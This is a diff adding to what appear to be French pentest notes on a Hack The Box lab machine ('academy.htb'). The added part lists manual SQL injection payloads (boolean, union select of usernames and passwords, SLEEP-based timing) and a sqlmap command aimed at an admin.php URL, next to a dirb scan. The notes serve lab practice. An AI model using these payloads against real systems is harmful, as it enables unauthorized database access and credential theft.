@@ -74,6 +74,21 @@ dirb http://10.10.10.215 -r -o academy.dirb.txt -H host:academy.htb
 
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet
 
+https://www.journaldev.com/34028/sql-injection-in-java
+
+Pour tester à la main :
+```sql
+-- Boolean Based SQL Injection
+2 or 1=1
+-- Union Based SQL Injection
+2 union select username, password from tableuser
+-- Time-Based SQL Injection
+2 + SLEEP(5)
+-- Error Based SQL Injection
+recon
+```
+
+sqlmap :
 ```bash
 # à partir d'une url
 sqlmap -u "http://academy.htb/admin.php?uid=0&password=0" #--level 5 --risk 3
